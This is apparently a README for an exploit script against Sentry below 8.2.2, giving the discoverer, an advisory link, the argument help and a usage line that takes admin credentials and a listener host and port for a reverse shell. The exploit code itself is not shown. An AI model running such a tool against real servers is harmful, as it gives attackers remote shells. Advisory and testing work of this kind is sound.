# Sentry-Authenticated-Remote-Code-Execution
## Sentry &lt; 8.2.2 Pickle Deserialization to RCE

<h4> Discovered By : Clement Berthaux (SYNACKTIV) </h4>
<h4> Advisory Link : https://doc.lagout.org/Others/synacktiv_advisory_sentry_pickle.pdf </h4>
<h4> Exploit DB Link :  </h4>

<h3> Usage : python exploit.py --url `http://<URL>/auth/login/sentry/` -U `username` -P `password` -l `LHOST` -p `LPORT`</h3>
  

usage: exploit.py [-h] [-U U] [-P P] [-l L] [-p P] [--url URL]

Sentry < 8.2.2 Authenticated RCE

optional arguments:
  -h, --help  show this help message and exit
  -U U        Sentry Admin Username / Email
  -P P        Sentry Admin Password
  -l L        Rev Shell LHOST
  -p P        Rev Shell LPORT
  --url URL   Sentry Login URL
              
              
![alt text](https://github.com/mohinparamasivam/Sentry-Authenticated-Remote-Code-Execution/blob/main/sentry_exploit.png?raw=true)              
              


# Dependencies

<h4>pip install requests</h4>
<h4>pip install bs4</h4>
<h4>pip install argparse</h4>

